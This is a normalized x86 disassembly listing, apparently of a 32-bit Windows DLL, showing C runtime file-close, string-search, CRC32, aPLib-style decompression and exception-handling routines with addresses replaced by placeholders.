push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001bc91
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1000e873
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c346
mov eax [ ebp - 0x1c ]
sub_1001c350
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_1001aa47
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_1000e901
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_1001aa47
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_1001aa47
push 0x1
mov edi eax
call sub_1001aa47
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1001a9c1
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1001c3ec
push 0x10
push r--data
call sub_10011ecc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_1000e8ee
and [ eax ] 0x0
call sub_1000e8db
mov [ eax ] 0x9
call sub_1000e8ee
mov [ eax ] edi
call sub_1000e8db
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_1000e873
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10011f11
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_1001aabe
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000e8db
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1001c350
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c4af
mov eax [ ebp - 0x1c ]
sub_1001c4b9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1000bf59
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1001c500
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_1001c4f0
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1001c5dc
pushad
mov esi [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov edi [ esp + 0x2c ]
test esi esi
je r-xdata
or eax 0xffffffff
test edi edi
je r-xdata
cmp ecx 0x18
jb r-xdata
mov ebx [ esi ]
cmp ebx 0x32335041
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp ebx 0x18
jb r-xdata
sub ecx ebx
jb r-xdata
cmp [ esi + 0x8 ] ecx
ja r-xdata
add ebx esi
push [ esi + 0x8 ]
push ebx
call sub_1001c93c
add esp 0x8
cmp eax [ esi + 0xc ]
jne r-xdata
mov ecx [ esp + 0x30 ]
cmp [ esi + 0x10 ] ecx
ja r-xdata
push ecx
push edi
push [ esi + 0x8 ]
push ebx
call sub_1001c680
add esp 0x10
cmp eax [ esi + 0x10 ]
jne r-xdata
mov ebx eax
push eax
push edi
call sub_1001c93c
add esp 0x8
cmp eax [ esi + 0x14 ]
mov eax ebx
je r-xdata
mov [ esp + 0x1c ] eax
popad
retn
sub_1001c65c
pushad
mov esi [ esp + 0x24 ]
mov ebx [ esi ]
or eax 0xffffffff
cmp ebx 0x32335041
jne r-xdata
mov [ esp + 0x1c ] eax
popad
retn
mov ebx [ esi + 0x4 ]
cmp ebx 0x18
jb r-xdata
mov eax [ esi + 0x10 ]
sub_1001c680
pushad
mov esi [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov edi [ esp + 0x2c ]
mov ecx [ esp + 0x30 ]
push eax
push ecx
test esi esi
je r-xdata
add esp 0x8
popad
or eax 0xffffffff
retn
test edi edi
je r-xdata
cld
xor edx edx
mov al [ esi ]
add esi 0x1
sub [ esp ] 0x1
jb r-xdata
mov [ edi ] al
add edi 0x1
mov ebx 0x2
jae r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
add dl dl
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
jae r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
mov eax 0x1
xor eax eax
add dl dl
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
adc eax eax
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
jae r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
add dl dl
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
sub [ esp + 0x4 ] 0x1
jb r-xdata
add dl dl
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
mov al [ esi ]
inc esi
xor ecx ecx
shr al 0x1
je r-xdata
adc eax eax
add dl dl
jne r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
add dl dl
jne r-xdata
sub eax ebx
mov ebx 0x1
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
add esp 0x8
sub edi [ esp + 0x2c ]
mov [ esp + 0x1c ] edi
popad
retn
adc ecx 0x2
mov ebp eax
push ecx
mov ecx [ esp + 0x3c ]
sub ecx [ esp + 0x4 ]
cmp eax ecx
pop ecx
ja r-xdata
adc eax eax
add dl dl
jne r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
dec eax
test eax 0xff000000
jne r-xdata
mov ecx 0x1
sub [ esp ] ecx
jb r-xdata
adc eax eax
add dl dl
jne r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
shl eax 0x8
sub [ esp + 0x4 ] 0x1
jb r-xdata
adc ecx ecx
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
push esi
mov esi edi
sub esi eax
[ edi ] [ esi ]
pop esi
mov ebx 0x1
jmp r-xdata
adc eax eax
je r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
mov al [ esi ]
inc esi
mov ebp eax
mov ecx 0x1
add dl dl
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
add dl dl
jne r-xdata
sub [ esp ] 0x1
jb r-xdata
mov ebx [ esp + 0x38 ]
sub ebx [ esp ]
cmp eax ebx
ja r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
adc ecx ecx
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
mov [ edi ] al
inc edi
mov ebx 0x2
jmp r-xdata
mov ebx edi
sub ebx eax
mov al [ ebx ]
add dl dl
jne r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
add dl dl
jne r-xdata
push ecx
mov ecx [ esp + 0x3c ]
sub ecx [ esp + 0x4 ]
cmp ebp ecx
pop ecx
ja r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
jb r-xdata
sub [ esp + 0x4 ] 0x1
jb r-xdata
sub [ esp ] ecx
jb r-xdata
add dl dl
jne r-xdata
cmp eax 0x7d00
sbb ecx 0xffffffff
cmp eax 0x500
sbb ecx 0xffffffff
cmp eax 0x80
adc ecx 0x0
cmp eax 0x80
adc ecx 0x0
push ecx
mov ecx [ esp + 0x3c ]
sub ecx [ esp + 0x4 ]
cmp eax ecx
pop ecx
ja r-xdata
mov dl [ esi ]
inc esi
add dl dl
inc dl
push esi
mov esi edi
sub esi ebp
[ edi ] [ esi ]
pop esi
jmp r-xdata
sub [ esp ] ecx
jb r-xdata
push esi
mov esi edi
sub esi eax
[ edi ] [ esi ]
pop esi
jmp r-xdata
sub_1001c93c
pushad
mov esi [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov edi r--data
sub eax eax
test esi esi
je r-xdata
mov [ esp + 0x1c ] eax
popad
retn
sub eax 0x1
test ecx ecx
je r-xdata
not eax
test esi 0x3
je r-xdata
mov edx ecx
and edx 0x7
shr ecx 0x3
je r-xdata
xor al [ esi ]
inc esi
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
dec ecx
jne r-xdata
mov ecx edx
test ecx ecx
je r-xdata
xor eax [ esi ]
add esi 0x4
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
xor eax [ esi ]
add esi 0x4
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
dec ecx
jne r-xdata
xor al [ esi ]
inc esi
mov ebx 0xff
and ebx eax
shr eax 0x8
xor eax [ edi + ebx * 4 ]
dec ecx
jne r-xdata
sub_1001ca26
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1001ca5f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1001cab3
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001db36
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1001cae9
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_1000ac69
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001db36
add esp 0x20
pop esi
pop ebp
retn
sub_1001cb1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1001cbf3
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_1000e343
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1001cbf3
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_1000ac69
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001db36
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001cb1c
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001ca5f
pop ebx
leave
retn
sub_1001cc92
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1001960e
call sub_1001960e
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1001cd07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1000e343
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1000e343
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1001cd33
mov edi edi
push ebp
mov ebp esp
call sub_1000e343
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1001cd5a
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1000e343
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1000e343
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1000e343
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1001960e
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_1001cdac
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1001cae9
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1001dc20
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1001ce0c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001ce3f
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001cf0c
push sub_10011f30
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_1001cf63
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_100121a2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001cf8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1001226f
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000b6da
pop ecx
sub_1001cfb3
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_100123b0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1001d012
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_1000e343
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_1000e343
add eax 0x90
dec [ eax ]
call sub_1000e343
and [ eax + 0x90 ] 0x0
jmp sub_100195c2
sub_1001d05b
push 0x10
push r--data
call sub_10011ecc
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d121
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1000e343
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_10011f11
retn
call sub_1001960e
call sub_1001960e
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_1001dc20
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1001d13c
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1000e343
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1001d181
push 0x8
push r--data
call sub_10011ecc
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_10011f11
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1001ca58
mov [ ebp - 0x4 ] 0xfffffffe
sub_1001d1d6
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1001d1ff
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_1001960e
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_1001cfb3
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1001d2c3
push 0x2c
push r--data
call sub_10011ecc
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_1001cd07
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_1000e343
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_1000e343
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_1000e343
mov [ eax + 0x88 ] esi
call sub_1000e343
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_1001cdac
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001d3e9
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
sub_1001d35c
mov esp [ ebp - 0x18 ]
call sub_1000e343
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_1001d05b
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_1001d3e9
mov eax [ ebp - 0x1c ]
call sub_10011f11
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_1001d3e9
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_1001cd5a
pop ecx
call sub_1000e343
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_1000e343
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
